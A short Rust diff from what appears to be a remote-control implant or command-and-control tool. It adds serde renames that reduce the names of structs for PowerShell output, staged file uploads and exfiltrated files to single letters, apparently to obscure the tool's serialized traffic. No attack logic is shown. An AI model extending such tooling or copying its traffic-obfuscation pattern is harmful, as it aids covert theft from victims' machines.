@@ -259,6 +259,7 @@ impl Display for Task {
 }
 
 #[derive(Serialize, Deserialize, Clone, Default)]
+#[serde(rename = "abc")]
 pub struct FirstRunData {
     /// `a` is alias for `cwd`
     pub a: PathBuf,
@@ -392,12 +393,16 @@ pub struct FileUploadStagingFromClient {
 }
 
 #[derive(Serialize, Deserialize, Clone)]
+#[serde(rename = "a")]
 pub struct PowershellOutput {
+    #[serde(rename = "b")]
     pub stdout: Option<String>,
+    #[serde(rename = "c")]
     pub stderr: Option<String>,
 }
 
 #[derive(Serialize, Deserialize)]
+#[serde(rename = "a")]
 pub struct ExfiltratedFile {
     #[serde(rename = "a")]
     pub hostname: String,
